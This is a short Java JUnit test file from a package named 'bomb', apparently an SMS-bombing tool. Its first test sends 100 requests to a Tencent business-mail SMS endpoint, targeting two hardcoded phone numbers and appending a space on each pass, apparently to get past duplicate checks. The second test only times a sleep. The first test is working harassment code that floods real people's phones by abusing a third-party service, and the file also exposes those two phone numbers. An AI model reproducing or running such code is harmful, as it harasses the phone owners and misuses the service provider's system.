package com.llmoe.bomb;

import cn.hutool.core.date.DateUtil;
import cn.hutool.http.HttpUtil;
import org.junit.jupiter.api.Test;

/**
 * @author llmoe
 * @date 2020/4/8 19:23
 */
public class TesetHoo {
    @Test
    public void tests() throws InterruptedException {
        String sj = "18689249984,15015786345";
        for (int i = 0; i < 100; i++) {
//            sj += "\n";
            sj += " ";
            String s = HttpUtil.get("https://exmail.qq.com/cgi-bin/bizmail_portal?action=send_sms&type=11&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8&area=86&mobile=" + sj);
            System.out.println("s = " + s);
            Thread.sleep(5000);
        }
    }


    @Test
    public void test2() throws InterruptedException {
        long old = DateUtil.currentSeconds();
        System.out.println("old = " + old);

        Thread.sleep(5000);

        long now = DateUtil.currentSeconds();
        System.out.println("now = " + now);

        System.out.println("打印耗时：" + (now - old) + " s");

    }
}
